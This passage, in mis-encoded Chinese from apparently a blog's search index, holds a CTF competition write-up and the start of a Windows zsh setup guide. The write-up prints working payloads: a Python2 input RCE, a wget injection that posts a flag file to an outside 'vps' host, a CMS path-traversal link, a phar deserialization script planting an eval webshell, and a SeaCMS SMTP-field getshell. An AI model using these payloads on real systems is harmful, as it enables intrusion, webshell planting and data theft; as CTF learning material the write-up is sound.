137, 164, 157, 137, 62, 157, 156, 147, 137, 150, 63, 156, 147, 137, 142, 145, 61, 175] flag = '' for i in flags: flag += chr(int(str(i),8)) print(flag) flag{w3lcome_to_2ong_h3ng_be1} é©¬èµ›å…‹åŸå›¾ï¼š åˆ©ç”¨ Depix å·¥å…· https://github.com/beurtschipper/Depix python depix.py -p mosaic/mosaic.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o mosaic/output.png å¾—åˆ° å†ç»“åˆ debruinseq_notepad_Windows10_closeAndSpaced.png è¿™å›¾ç‰‡äººå·¥è¯†åˆ«ä¸€ä¸‹ï¼Œå¾—åˆ° flagã€‚ flag{0123468abd68abd0123} æ²¡æƒ³åˆ°ä¹‹å‰é€› GitHub çœ‹åˆ°çš„å·¥å…·å±…ç„¶å°±åœ¨ CTF é¢˜ç›®é‡Œç”¨åˆ°äº†ï¼Œå¦™å•Š~ My_Secret LSB have a deep secret PASS1 is 123456 ä¸‹è½½ä¸‹æ¥ä¸¤å¼ å›¾ç‰‡ä¸€ä¸ªéŸ³é¢‘ï¼ŒéŸ³é¢‘å¬äº†æ²¡å•¥æ˜æ˜¾é—®é¢˜ã€‚ stego.png æ‹¿ StegSolve çœ‹äº†ä¸€ä¸‹ RGB é‡Œ LSB éƒ½æœ‰æ•°æ®ã€‚ ç”¨ https://github.com/livz/cloacked-pixel è¿™ä¸ªå·¥å…·æ¥è§£å¯† LSB æ•°æ®ï¼Œå¯†ç å°±æ˜¯é¢˜ç›®æ‰€ç»™çš„ 123456ã€‚ å¾—åˆ°å¯†é’¥ä¸º 38d668578a3686abã€‚ å¯¹ 01 blood and wine.wav ç”¨ DeepSound è§£å¯†ã€‚ å¾—åˆ°å¯†é’¥ä¸º carrierã€‚ æ ¹æ®å›¾ç‰‡å’Œé¢˜ç›®æç¤ºï¼Œç”¨ oursecret è§£å¯† æ‹¿åˆ° flag flag{3072d7b4-d3f4-4d8a-bd8b-ac9285df11f2} babymaze2_betaï¼ˆbabymaze1 èµ°è¿·å®«ï¼Œé˜Ÿå‹æ‰“çš„ï¼Œä¸è¿‡ç¯å¢ƒå…³äº†ï¼Œä¹Ÿæ²¡æºä»£ç ï¼Œå¤ç°ä¸äº†äº†å°±ä¸å†™äº†8 è¿™é¢˜ä¹Ÿæ˜¯èµ°è¿·å®«ï¼Œä¸è¿‡æ¯æ¬¡åªç»™å‡ºå½“å‰ä½ç½®é™„è¿‘çš„ 3*3 çš„ç¯å¢ƒæƒ…å†µã€‚ é™„ä»¶çš„è¯å€’æ˜¯ç»™äº†ä¸ª .so æ–‡ä»¶ï¼Œpython å†™çš„ï¼Œä¸ä¼šé€†å˜¤å˜¤å˜¤ã€‚ ä½†æ˜¯çœŸæ²¡æƒ³åˆ°èƒ½éé¢„æœŸï¼Œå­¦åˆ°äº†å­¦åˆ°äº†ã€‚ Python2 input RCE __import__('os').system('cat flag') å¤ç°æˆåŠŸå–µ~ BTWï¼Œæƒ³çŸ¥é“è¿™é¢˜çœŸæ­£åšçš„è¯æ€ä¹ˆå†™ï¼ˆ magic_downloadrun.sh #!/bin/bash ulimit -c 0 # core dump size (kb) ulimit -t 60 # max cpu using (s/min) ulimit -u 1500 # max number of process ulimit -m 512000 # max memory (kb) cd /home/ctf stdbuf -oL echo -n \"Please enter your IP:\" read IP echo $IP|grep \"^[0-9\\.]\\{7,15\\}$\" &gt; /dev/null if [ $? -ne 0 ] then stdbuf -oL echo \"Please input a IP!\" else exec /home/ctf/wget -P /tmp $IP fi è¾“å…¥ä¸€ä¸ª IPï¼Œç„¶å grep åˆ¤æ–­æ˜¯å¦æ ¼å¼åˆç†ã€‚ å¤§å¸ˆå‚…æœ‰è¨€ï¼Œæ¢è¡Œ \\n å†ç»“åˆ echo çš„ -e å‚æ•°å°±èƒ½ç»•è¿‡äº†ã€‚ è€Œä¸”è¿™ä¸ª -e å‚æ•°åœ¨ wget é‡Œä¹Ÿæ˜¯å­˜åœ¨çš„ã€‚ Payload: -e --post-flie=/home/ctf/flag http://vps:port/ \\\\n127.0.0.1 echo å‡ºæ¥ç»“æœå°±æ˜¯ --post-flie=/home/ctf/flag http://vps:port/ 127.0.0.1 è€Œ grep å°±ä¼šåŒ¹é…åˆ°æœ€åä¸€è¡Œçš„ 127.0.0.1ï¼Œäºæ˜¯å°±è®¤ä¸ºæ˜¯åˆç† IP äº†ã€‚ ï¼ˆå­¦åˆ°äº†å­¦åˆ°äº† é—®å·è°ƒæŸ¥flag{thanks_for_playing_our_games} WebezcmsYzmCMS www.zip æºç æ³„éœ² /www/common/config/config.php é…ç½®æ–‡ä»¶ //æ•°æ®åº“é…ç½® 'db_type' =&gt; 'pdo', // æ•°æ®åº“é“¾æ¥æ‰©å±• , æ”¯æŒ pdo | mysqli | mysql 'db_host' =&gt; '127.0.0.1', // æœåŠ¡å™¨åœ°å€ 'db_name' =&gt; 'admin', // æ•°æ®åº“å 'db_user' =&gt; 'admin', // ç”¨æˆ·å 'db_pwd' =&gt; 'admin868', // å¯†ç  'db_port' =&gt; 3306, // ç«¯å£ 'db_prefix' =&gt; 'yzm_', // æ•°æ®åº“è¡¨å‰ç¼€ /admin åå°å¼±å£ä»¤ç™»å½•ï¼Œç”¨æˆ·åå¯†ç åŒæ•°æ®åº“é…ç½®ã€‚ adminadmin868 å‚è€ƒ https://www.cnblogs.com/Spec/p/11188198.html /www/yzmphp/core/class/collection.class.php è¿™é‡Œç›¸å¯¹äºå®˜æ–¹æºç å»æ‰äº† curl æ‰§è¡Œï¼Œç›´æ¥ç”¨ file_get_contents æ¥æ‰§è¡Œäº†ã€‚ æ¨¡å—ç®¡ç†ä¸‹çš„ é‡‡é›†ç®¡ç†ï¼Œç½‘å€é…ç½®ä¸º vps ä¸Šä¸€ä¸ªé¡µé¢ï¼Œvps ä¸Šæ”¾ payloadã€‚ é¡µé¢ä¸Šæ”¾ä¸Šä¸€ä¸ª a æ ‡ç­¾ï¼Œæ„é€ ç›®å½•ç©¿è¶Šã€‚ å…ˆè¯•äº†è¯• file åè®®ï¼Œå‘ç°ä¼šæç¤º é“¾æ¥åœ°å€ä»…å…è®¸HTTPå’ŒHTTPSåè®®ï¼ å†æŸ¥çœ‹æºç ã€‚ url_checkå‡½æ•° /** * URLåœ°å€æ£€æŸ¥ * @param string $url éœ€è¦æ£€æŸ¥çš„URL * @param string $baseurl åŸºæœ¬URL * @return string */ protected static function url_check($url, $baseurl) { $urlinfo = parse_url($baseurl); if(strpos($url, '://') === false) { if($url[0] == '/'){ $url = $urlinfo['scheme'].'://'.$urlinfo['host'].$url; }else{ $baseurl = $urlinfo['scheme'].'://'.$urlinfo['host'].(substr($urlinfo['path'], -1, 1) === '/' ? substr($urlinfo['path'], 0, -1) : str_replace('\\\\', '/', dirname($urlinfo['path']))).'/'; $url = $baseurl.$url; } } if(substr($url, 0, 4) != 'http') showmsg('é“¾æ¥åœ°å€ä»…å…è®¸HTTPå’ŒHTTPSåè®®ï¼', 'stop'); return $url; } å¯è§åªè¦æ„é€ ä»¥ http å¼€å¤´çš„ url å³å¯ç»•è¿‡ checkã€‚ Payload: &lt;test&gt;&lt;a href=\"httpss://miaotony.xyz/../../../../../../../../flag\"&gt;meow&lt;/a&gt;&lt;/test&gt; æµ‹è¯•é‡‡é›†ï¼Œå¾—åˆ° flag flag{de3974b7-9c59-4317-b7ab-479b4e058683} hello_php XXXCMSæ˜¯ä¸€ç§å¯ä»¥ç»¼åˆç®¡ç†ç½‘ç«™ä¸Šå„ç§æ ç›®çš„é€šç”¨å·¥å…·ï¼Œæ–°é—»ã€äº§å“ã€æ–‡æ¡£ã€ä¸‹è½½ã€éŸ³ä¹ã€æ•™å­¦è§†é¢‘â€¦â€¦ï¼Œé€šè¿‡æ¨¡ç‰ˆæŠ€æœ¯ï¼Œä»–ä»¬éƒ½åœ¨åŒä¸€å¥—ç³»ç»Ÿé‡Œå®Œæˆæ›´æ–°å’Œç»´æŠ¤ã€‚XXXCMS æ˜¯ç›®å‰å›½å†…æœ€å¼ºå¤§ã€æœ€ç¨³å®šçš„ä¸­å°å‹é—¨æˆ·ç½‘ç«™å»ºè®¾è§£å†³æ–¹æ¡ˆä¹‹ä¸€ï¼ŒåŸºäºPHPã€ MySQLçš„æŠ€æœ¯å¼€å‘ï¼Œå…¨éƒ¨æºç å¼€æ”¾ã€‚ www.zip æºç æ³„éœ² config.php &lt;?php error_reporting(0); $title='XXXä¿¡æ¯ç®¡ç†ç³»ç»Ÿ'; $commnet='XXXCMSæ˜¯ä¸€ç§å¯ä»¥ç»¼åˆç®¡ç†ç½‘ç«™ä¸Šå„ç§æ ç›®çš„é€šç”¨å·¥å…·ï¼Œæ–°é—»ã€äº§å“ã€æ–‡æ¡£ã€ä¸‹è½½ã€éŸ³ä¹ã€æ•™å­¦è§†é¢‘â€¦â€¦ï¼Œé€šè¿‡æ¨¡ç‰ˆæŠ€æœ¯ï¼Œä»–ä»¬éƒ½åœ¨åŒä¸€å¥—ç³»ç»Ÿé‡Œå®Œæˆæ›´æ–°å’Œç»´æŠ¤ã€‚XXXCMS æ˜¯ç›®å‰å›½å†…æœ€å¼ºå¤§ã€æœ€ç¨³å®šçš„ä¸­å°å‹é—¨æˆ·ç½‘ç«™å»ºè®¾è§£å†³æ–¹æ¡ˆä¹‹ä¸€ï¼ŒåŸºäº PHP MySQL çš„æŠ€æœ¯å¼€å‘ï¼Œå…¨éƒ¨æºç å¼€æ”¾ã€‚'; $logo_url='./static/default.jpg'; $admin_user='admin'; $admin_pass='admin888'; $footer=&lt;&lt;&lt;EOD &lt;script src=\"https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js\" &gt;&lt;/script&gt; &lt;script src=\"https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js\"&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; EOD; ä»ä¸­å¾—çŸ¥ç”¨æˆ·åå¯†ç ä¸º adminadmin888 åœ¨ login.php ç™»å½•ï¼Œç„¶åè®¿é—® admin.phpï¼Œæºç å¦‚ä¸‹ã€‚ &lt;?php session_start(); include 'class.php'; if (!@$_SESSION['isadmin'] == True) { die(\"&lt;script&gt;alert('è¯·ç™»å½•');history.go(-1);&lt;/script&gt;\"); } if (!isset($_GET['upload']) &amp;&amp; !isset($_GET['update'])) { include_once 'header.php';?&gt; &lt;nav class=\"navbar navbar-light bg-light\"&gt; &lt;p&gt; &lt;button class=\"btn btn-primary\" type=\"button\" data-toggle=\"collapse\" data-target=\"#upload\" aria-expanded=\"false\" aria-controls=\"upload\"&gt; ä¸Šä¼ ç½‘ç«™å›¾æ ‡ &lt;/button&gt; &lt;button class=\"btn btn-primary\" type=\"button\" data-toggle=\"collapse\" data-target=\"#update\" aria-expanded=\"false\" aria-controls=\"update\"&gt; ä¿®æ”¹ç½‘ç«™æ ‡é¢˜ &lt;/button&gt; &lt;button class=\"btn btn-primary\" type=\"button\" data-toggle=\"collapse\" data-target=\"#reset\" aria-expanded=\"false\" aria-controls=\"reset\"&gt; æ¢å¤å‡ºå‚è®¾ç½® &lt;/button&gt; &lt;/nav&gt; &lt;/p&gt; &lt;div id=\"upload\"&gt; &lt;div class=\"card card-body\"&gt; &lt;form action=\"admin.php?upload\" method=\"POST\" enctype='multipart/form-data'&gt; &lt;input type=\"file\" name='file' value='abs'&gt; &lt;input type=\"submit\" class=\"btn btn-primary\" value='ä¸Šä¼ '&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=\"update\"&gt; &lt;div class=\"card card-body\"&gt; åƒåœ¾è€æ¿å°±ç»™æˆ‘è¿™ä¹ˆç‚¹é’±ï¼Œå«æˆ‘æ€ä¹ˆå¸®ä½ åšäº‹ã€‚ &lt;form action=\"admin.php?update\" method=\"post\"&gt; &lt;input type=\"text\" name=\"lalal\" placeholder='è¯·è¾“å…¥ç½‘ç«™æ ‡é¢˜' class='form-control'&gt; &lt;input type=\"submit\" class='btn btn-primary'&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"collapse\" id=\"reset\"&gt; &lt;div class=\"card card-body\"&gt; åˆ åº“è·‘è·¯çš„è‰ºæœ¯å°±æ˜¯æƒ³åˆ å°±åˆ ï¼Œæƒ³æ¢å¤å°±æ¢å¤ã€‚ &lt;a id=\"resetbtn\" class=\"btn btn-primary\"&gt;ç‚¹æˆ‘é‡ç½®&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;script&gt; $(\"#resetbtn\").click(function(){ xhr = new XMLHttpRequest(); xhr.open('GET', './reset.php', true); xhr.send(); location.reload(); });&lt;/script&gt; &lt;?php } else if (isset($_GET['upload'])) { $config-&gt;upload_logo(); } else if (isset($_GET['update'])) { die('&lt;script&gt;alert(åƒåœ¾è€æ¿å°±ç»™æˆ‘è¿™ä¹ˆç‚¹é’±ï¼Œå«æˆ‘æ€ä¹ˆå¸®ä½ åšäº‹./);history.go(-1)&lt;/script&gt;'); } echo $footer; ?&gt; index.php &lt;?php include_once('header.php');?&gt; &lt;?php if(isset($_GET['img'])&amp;&amp;file_exists($_GET['img'])){?&gt; &lt;img src=\"&lt;?php echo $_GET['img'];?&gt;\" class=\"d-inline-block align-top\" alt=\"\" loading=\"lazy\"&gt; &lt;?php } else {?&gt; &lt;img src=\"&lt;?php echo $config-&gt;logo_url;?&gt;\" class=\"d-inline-block align-top\" alt=\"\" loading=\"lazy\"&gt; &lt;?php }?&gt; &lt;p&gt;&lt;?php echo $config-&gt;comment;?&gt;&lt;/p&gt; &lt;?php echo $footer;?&gt; å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœè®¾ç½®äº† img å‚æ•°ï¼Œåˆ™ä¼šå»è¯»å–è¿™ä¸ªæ–‡ä»¶è¾“å‡ºåˆ°é¡µé¢ä¸Šã€‚ class.php &lt;?php include('config.php'); class Config{ public $title; public $comment; public $logo_url; public function __construct(){ global $title; global $comment; global $logo_url; $this-&gt;title= $title; $this-&gt;comment = $comment; $this-&gt;logo_url = $logo_url; } public function upload_logo(){ if(!empty($_FILES)){ $path='./static/'.md5(time()).'.jpg'; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],'./static/'.md5(time()).'.jpg'); } } public function update_title($title,$comment){ #åƒåœ¾è€æ¿å°±ç»™æˆ‘è¿™ä¹ˆç‚¹é’±ï¼Œå«æˆ‘æ€ä¹ˆå¸®ä½ åšäº‹ã€‚ } public function __destruct(){ $file = file_get_contents(pathinfo($_SERVER['SCRIPT_FILENAME'])['dirname'].'/config.php'); $file = preg_replace('/\\$title=\\'.*?\\';/', \"\\$title='$this-&gt;title';\", $file); $file = preg_replace('/\\$comment=\\'.*?\\';/', \"\\$commnet='$this-&gt;comment';\", $file); file_put_contents(pathinfo($_SERVER['SCRIPT_FILENAME'])['dirname'].'/config.php', $file); } } $config=new Config; ?&gt; __destruct ææ„å‡½æ•°é‡Œä¼šå°†é…ç½®ä¿å­˜åˆ° config.php æ–‡ä»¶ä¸­ï¼Œè¦†ç›–æ‰å½“å‰é…ç½®ã€‚ äºæ˜¯å°± ç”¨ phar æ‰“ååºåˆ—åŒ– æ ¹æ®ä¸Šé¢çš„æºç å†™ payload &lt;?php class Config{ public $title; public $comment; public $logo_url; } @unlink(\"test.phar\"); $phar = new Phar(\"test.phar\"); //åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"GIF89a\".\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //è®¾ç½®stub $o = new Config(); $o-&gt;title=\"';eval(\\$_POST['a']);#\"; $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ $phar-&gt;stopBuffering(); //ç­¾åè‡ªåŠ¨è®¡ç®— ?&gt; ç”Ÿæˆ phar ååœ¨ admin.php ä¸Šä¼ ã€‚ è€Œåè®¿é—® index.php?img=phar://./static/xxxxxxxx.jpg/test.txt è§¦å‘ååºåˆ—åŒ–ã€‚ å…¶ä¸­çš„ xxxxxxxx å¯ä»¥é€šè¿‡ header è¿”å›çš„ Date è½¬æ¢ä¸ºæ—¶é—´æˆ³ï¼Œå†å– md5 æ¥è·å¾—ã€‚ ä¾‹å¦‚ï¼š var_dump(md5(\"1609158265\")); # string(32) \"b6e6c77a88da0935b34610e53081acb6\" æœ€ååœ¨ config.php ç”¨ä¸€å¥è¯æœ¨é©¬æ‹¿ flagã€‚ BTW, åˆ©ç”¨æ¡ä»¶ï¼š â‘  phar æ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ â‘¡ è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€œè·³æ¿â€ â‘¢ è¦æœ‰æ–‡ä»¶æ“ä½œå‡½æ•°ï¼Œå¦‚file_exists()ï¼Œfopen()ï¼Œfile_get_contents()ï¼Œfile() â‘¢ æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”:ã€/ã€pharç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ References: å…³äºpharååºåˆ—åŒ–â€”â€”BUUCTF-[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox PHPååºåˆ—åŒ–å…¥é—¨ä¹‹phar å¤§å®¶ä¸€èµ·æ¥å®¡ä»£ç  å°è·¯å­¦ä¼šäº†æ¸—é€åŸºç¡€ï¼Œçªç„¶æœ‰ä¸€å¤©ç‰¹åˆ«æ— èŠæƒ³è¦æ¸—é€ï¼Œå¥¹è¯·æ•™äº†æŸå¤§ä½¬ï¼Œå¤§ä½¬ä¸¢ç»™äº†å¥¹ä¸€ä¸ªç½‘ç«™åœ°å€å’Œç½‘ç«™æºç (www.zip)ï¼Œç„¶åï¼Œç„¶åï¼Œå°è·¯å°±å¼€å§‹äº†è‹¦é€¼çš„ä»£ç å®¡è®¡ä¹‹æ—…ï¼Œè¶Šæ˜¯å®¡è¶Šæƒ³å’Œå‘¨å…¬çº¦ä¼šï¼Œå¿«æ¥æ•‘æ•‘å¥¹å§ï¼ï¼ï¼ www.zip æºç æ³„éœ² /adm1n åå°å¼±å£ä»¤ç™»å½• adminadmin æµ·æ´‹CMS æœ‰ä¸€å †æ´ï¼ˆ å‘ç° GitHub ä¸Šæœ‰äººæäº† åå° getshell çš„ issueï¼š https://github.com/ciweiin/seacms/issues/11 åœ¨ é‚®ä»¶æœåŠ¡å™¨è®¾ç½®è¿™é‡ŒæŠŠ SMTP åœ°å€è®¾ä¸º ${eval($_POST[cmd])} è€Œååœ¨ /data/admin/smtp.php è·¯å¾„ä¸‹æ‰§è¡Œæœ¨é©¬æ‹¿ flag å³å¯ã€‚ å°ç»“å­¦åˆ°äº†ä¸å°‘å–µ~ BTWï¼Œè¿™æ¯”èµ›åˆ°æœ€åå¤§å®¶ç–¯ç‹‚äº¤ flagï¼Œå¤ªå·äº†å¤ªå·äº†ã€‚ å°±å…ˆè¿™æ ·å§ï¼Œè¿™å‡ å¤©è¦å¤§é™æ¸©äº†ï¼Œæ³¨æ„ä¿æš–w ï¼ˆæºœäº†æºœäº†å–µ","path":"2020/12/28/CTF_2020zongheng/"},{"title":"Install Terminal + git-bash + zsh + oh-my-zsh on Windows 10","text":"å‰è¨€ä¸€ç›´ä»¥æ¥åœ¨ Windows 10 ä¸Šä¸€èˆ¬æ˜¯ç›´æ¥ç”¨è‡ªå¸¦çš„ cmd æˆ–è€… PowerShellï¼Œæ„Ÿè§‰ç•Œé¢æ˜¯æŒºä¸‘çš„ã€‚ å¦ä¸€æ–¹é¢åœ¨ Linux ç¯å¢ƒä¸‹ç”¨ zsh åŠ äº†è‡ªåŠ¨è¡¥å…¨ç”¨ç€å°±è´¼çˆ½ï¼Œäºæ˜¯å°±æƒ³åˆ°èƒ½ä¸èƒ½åœ¨ Windows ä¸‹ä¹Ÿæ•´ä¸ª zshã€‚ å¤§æ¦‚æœäº†ä¸€ä¸‹ï¼Œå¯ä»¥æœ‰ä»¥ä¸‹å‡ ç§é€‰æ‹©ã€‚ WSL (Windows Subsystem for Linux, é€‚ç”¨äº Linux çš„ Windows å­ç³»ç»Ÿ) + zsh CygWin + zsh Git Bash + zsh ç”±äºå·²ç»é…äº†è™šæ‹Ÿæœºï¼Œåœ¨ Windows 10 ä¸Šä¸å¤§æƒ³ä¹Ÿæ‡’å¾—è£… WSL2ï¼ˆè€Œä¸”è¿˜å ç”¨ä¸€å † Cç›˜ç©ºé—´æ— æ³•æ¥å—ï¼‰ï¼Œè€Œ Git å¸¦æœ‰çš„ Bash æ„Ÿè§‰æ˜¯ä¸ªä¸é”™çš„é€‰æ‹©ã€‚ äºæ˜¯æŠ˜è…¾äº†ä¸€ä¸‹ï¼Œé…äº†ä¸ª Windows Terminal + git-bash + zsh + oh-my-zshï¼Œæ„Ÿè§‰æœ‰ç‚¹æ„æ€ï¼Œè¿™é‡Œé¡ºä¾¿å°±æ¥è®°å½•ä¸€ä¸‹ã€‚ Steps0x00 å®‰è£… git bash for windowså®˜æ–¹ä¸‹è½½é“¾æ¥ï¼Œç‚¹å¼€å°±èƒ½å¼¹å‡ºä¸‹è½½ â†“ https://git-scm.com/download/win å®‰è£…å°±ç•¥äº†ï¼Œå½“å‰çš„æœ€æ–°ç‰ˆæœ¬æ˜¯ 2.29.2ã€‚å®‰è£…å®Œæˆåä¼šæœ‰ä¸ª git bash ç¨‹åºã€‚ ï¼ˆå•Šï¼Œæˆ‘å‘ç°å¿˜è®°æˆªå›¾äº†ï¼Œé—®é¢˜ä¸å¤§ï¼‰ è®°å¾—ç•™æ„ä¸€ä¸‹ Git çš„å®‰è£…ç›®å½•ï¼Œä¸‹é¢ä¼šç”¨åˆ°ã€‚ ä¾‹å¦‚æˆ‘å®‰è£…åœ¨ D:\\Program Files\\Gitã€‚ 0x01 å®‰è£… zsh Zsh is a shell designed for interactive use, although it is also a powerful scripting language. Many of the useful features of bash, ksh, and tcsh were incorporated into zsh; many original features were added. The introductory document details some of the unique features of zsh. It assumes basic knowledge of the standard UNIX shells; the intent is to show a reader already familiar with one of the other major shells what makes zsh more useful or more powerful. åœ¨ä¸‹é¢çš„ç½‘ç«™å¯ä»¥ä¸‹è½½åˆ°æœ€æ–°çš„ zsh å®‰è£…åŒ…ï¼š https://packages.msys2.org/package/zsh?repo=msys&amp;variant=x86_64 ä¸‹è½½å®Œæˆåè§£å‹å†è§£å‹ï¼Œå¯ä»¥çœ‹åˆ°æ–‡ä»¶å¦‚ä¸‹ã€‚ å°†è¿™äº›æ–‡ä»¶ç›´æ¥è§£å‹åˆ° Git çš„å®‰è£…ç›®å½•ä¸‹ï¼Œä¸ä¹‹å‰çš„æ–‡ä»¶è¿›è¡Œåˆå¹¶ï¼Œå¯ä»¥ç†è§£ä¸ºæŠŠ zsh å½“ä½œ git bash çš„ä¸€ä¸ªè¡¥å……å®‰è£…åŒ…ã€‚ å®Œæˆåçš„æ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ æ­¤æ—¶æˆ‘ä»¬æ‰“å¼€ git bashï¼Œæ•²ä¸‹ zshï¼Œç¥å¥‡çš„åœºé¢å‡ºç°äº† æˆ‘ä»¬å¹¶æ²¡æœ‰æˆåŠŸåˆ‡æ¢åˆ° zshï¼ˆå½“ç„¶ä½ è¿›å…¥äº†å½“æˆ‘æ²¡è¯´ è¿™å•¥å›äº‹å•Šï¼Ÿè¿™ä¸å¯¹åŠ²å•Šï¼æˆ‘ä»¬å›å»çœ‹çœ‹åˆå¹¶äº†ä»€ä¹ˆæ–‡ä»¶å§ã€‚ bash ä¼šè°ƒç”¨ /usr/bin/ ä¸‹çš„å¯æ‰§è¡Œç¨‹åºï¼Œè€Œ zsh ä¹Ÿåœ¨è¿™ä¸ªç›®å½•ä¸‹ã€‚ å‘ç°è¿™ä¸ª zsh.exe æ–‡ä»¶å¤§å°ä¸º0ï¼Œæ„Ÿè§‰å¯èƒ½æ˜¯ä¸ªé“¾æ¥/å¿«æ·æ–¹å¼å•¥çš„ï¼Œä½†ä¸æ‡‚ä¸ºå•¥è¿™é‡Œç”¨ä¸é€šã€‚ è€ŒçœŸæ­£ç”¨åˆ°çš„æ˜¯è¿™ä¸ª zsh-5.8.exeã€‚ äºæ˜¯æˆ‘ä»¬åˆ æ‰ zsh.exeï¼ŒæŠŠ zsh-5.8.exe æ›´åä¸º zsh.exe å°±å®Œäº‹äº†ã€‚ è¿™æ—¶å†å¯åŠ¨ git bashï¼Œæ•²ä¸‹ zshï¼Œå˜¿å˜¿ï¼Œç†Ÿæ‚‰çš„ zsh å‡ºæ¥äº†ï¼ å½“ç„¶è¿™é‡Œå¯èƒ½ä¼šæç¤ºéœ€è¦ä½ é…ç½®ä¸€ä¸‹ .zshrcï¼Œè¿™ä¸ªåé¢å†è¯´ã€‚ çœ‹ä¸€ä¸‹ zsh ç‰ˆæœ¬ã€‚ zsh --version 0x02 å®‰è£… Oh My Zshzsh éƒ½æœ‰äº†ï¼Œæ€ä¹ˆèƒ½ä¸ä¸Š oh my zsh å‘¢ã€‚ Oh My Zsh is a delightful, open source, community-driven framework for managing your Zsh configuration. It comes bundled with thousands of helpful functions, helpers, plugins, themes, and a few things that make you shoutâ€¦ â€œOh My ZSH!â€ Official Website: http://ohmyz.sh GitHub repo: https://github.com/ohmyzsh/ohmyzsh åœ¨ zsh é‡Œæ‰§è¡Œï¼ˆcurlï¼‰ sh -c \"$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\" # æˆ–è€… # sh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\" æˆ–è€…ç”¨ wget sh -c \"$(wget https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh -O -)\" å›½å†…ä¸‹è½½å¯èƒ½ä¼šä¸å¤§è¡Œï¼ˆDNS æ±¡æŸ“ä¹‹ç±»çš„ï¼‰ï¼Œé‚£å°±æŒ‚ä¸ª ladder ä»€ä¹ˆçš„åœ¨æµè§ˆå™¨å…ˆä¸‹è½½åˆ°æœ¬åœ°ï¼Œç„¶ååœ¨ zsh é‡Œ sh install.sh è¿›è¡Œå®‰è£…ã€‚ ç”±äº chsh åœ¨ git bash é‡Œæ²¡æœ‰ï¼Œè¿™é‡Œå¯èƒ½ä¼šæŠ¥é”™ï¼Œä½†é—®é¢˜ä¸å¤§~ oh my zsh ç›¸å…³çš„æ–‡ä»¶å­˜æ”¾åœ¨ ~/.oh-my-zsh ç›®å½•ä¸‹ã€‚ è€Œ ~ çš„ç›®å½•ä¸º C:\\Users\\&lt;your username&gt;. lib æä¾›äº†æ ¸å¿ƒåŠŸèƒ½çš„è„šæœ¬åº“ tools æä¾›å®‰è£…ã€å‡çº§ç­‰åŠŸèƒ½çš„å¿«æ·å·¥å…· plugins è‡ªå¸¦æ’ä»¶çš„å­˜æ”¾ä½ç½® templates è‡ªå¸¦æ¨¡æ¿çš„å­˜æ”¾ä½ç½® themes è‡ªå¸¦ä¸»é¢˜æ–‡ä»¶çš„å­˜æ”¾ä½ç½® custom ä¸ªæ€§åŒ–é…ç½®ç›®å½•ï¼Œè‡ªå®‰è£…çš„æ’ä»¶å’Œä¸»é¢˜å¯æ”¾è¿™é‡Œ Oh My Zsh é»˜è®¤è‡ªå¸¦äº†ä¸€äº›é»˜è®¤ä¸»é¢˜ï¼Œå­˜æ”¾åœ¨~/.oh-my-zsh/pluginsç›®å½•ä¸­ï¼Œå¯ä»¥é€šè¿‡ç¼–è¾‘ ~/.zshrc æ–‡ä»¶ä¸­çš„ ZSH_THEME=\"robbyrussel\" è¿›è¡Œé…ç½®ã€‚ P.S.: å¾ˆå¤šä¸»é¢˜éœ€è¦å…ˆå®‰è£… Powerline Fonts æ‰èƒ½æ­£å¸¸æ¸²æŸ“å›¾æ ‡ã€‚ 0x03 Oh My Zsh æ’ä»¶ &amp; ä¸€äº›é…ç½®zsh-autosuggestions è‡ªåŠ¨è¡¥å…¨ https://github.com/zsh-users/zsh-autosuggestions å‚è€ƒ å®˜æ–¹å®‰è£…è¯´æ˜ git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions ç„¶åç¼–è¾‘ ~/.zshrcï¼ŒåŠ å…¥æ’ä»¶ã€‚ æ³¨æ„æ˜¯ä»¥ ç©ºæ ¼ æˆ–è€… ç©ºè¡Œ ä½œä¸ºåˆ†éš”ç¬¦ã€‚ plugins=( [plugins...] zsh-autosuggestions) æœ€åé‡å¯ zsh å³å¯ã€‚ zsh-syntax-highlighting è¯­æ³•é«˜äº® https://github.com/zsh-users/zsh-syntax-highlighting å‚è€ƒ å®˜æ–¹å®‰è£…è¯´æ˜ã€‚ git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting ç„¶åç¼–è¾‘ ~/.zshrcï¼ŒåŠ å…¥æ’ä»¶ã€‚ plugins=( [plugins...] zsh-syntax-highlighting) æœ€åé‡å¯ zsh å³å¯ã€‚ ç»™historyå‘½ä»¤å¢åŠ æ—¶é—´å•Šå…¶å®è¿™ä¸ªä¸ç®—æ˜¯æ’ä»¶ï¼Œæ··å…¥çš„å–µï¼ˆ æŠŠ HIST_STAMPS 